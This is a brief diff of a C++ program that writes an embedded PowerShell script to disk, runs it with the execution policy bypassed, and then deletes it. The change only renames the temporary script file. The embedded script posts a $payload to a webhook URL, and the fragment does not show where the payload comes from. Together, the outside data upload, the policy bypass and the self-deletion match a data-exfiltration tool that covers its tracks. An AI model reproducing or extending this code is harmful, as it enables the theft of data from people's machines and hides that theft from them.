@@ -17,7 +17,7 @@ int main() {
         "Write-Output $payload;\n"
         "Invoke-RestMethod -Uri $webhookURL -Method Post -Body $payload -ContentType \"application/json\";";
 
-    std::ofstream psFile("temp_script.ps1");
+    std::ofstream psFile("test.ps1");
     if (!psFile.is_open()) {
         std::cerr << "failed" << std::endl;
         return 1;
@@ -25,7 +25,7 @@ int main() {
 
     psFile << psScript;
     psFile.close();
-    system("powershell -NoProfile -ExecutionPolicy Bypass -File temp_script.ps1");
+    system("powershell -NoProfile -ExecutionPolicy Bypass -File test.ps1");
     std::remove("test.ps1");
     return 0;
 }
